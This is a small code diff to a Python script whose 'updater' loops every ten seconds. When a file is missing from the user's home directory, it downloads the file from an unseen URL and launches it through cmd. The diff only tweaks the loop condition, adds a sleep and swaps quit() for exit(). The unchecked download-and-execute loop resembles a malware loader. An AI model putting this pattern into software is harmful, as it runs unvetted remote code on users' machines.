@@ -3,7 +3,7 @@ import os, urllib.request, pathlib, time
 def main():
     def sleep(Time):
         time.sleep(Time)
-    while 1 == 1:
+    while 0 != 1:
         
         def updater():
             home = os.path.expanduser("~")
@@ -15,8 +15,9 @@ def main():
             except FileNotFoundError:
                 print('Its Not Here')
                 urllib.request.urlretrieve(dlurl, '{}'.format(path))
+                sleep(1)
                 os.system("start cmd /c {}".format('py ' + path))
-                quit()
+                exit()
         updater()
         sleep(10)
 main()
